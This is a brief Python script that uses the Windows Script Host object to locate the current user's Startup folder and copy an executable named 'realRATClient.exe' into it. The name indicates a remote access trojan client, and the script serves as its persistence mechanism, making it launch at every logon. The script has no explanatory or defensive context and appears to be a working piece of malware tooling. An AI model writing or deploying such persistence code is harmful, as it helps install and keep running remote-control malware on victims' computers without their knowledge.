import win32com.client
import shutil
oShell = win32com.client.Dispatch("Wscript.Shell")
destination=oShell.SpecialFolders("Startup")
src_path = "realRATClient.exe"
shutil.copy(src_path, destination+"\\realRATClient.exe")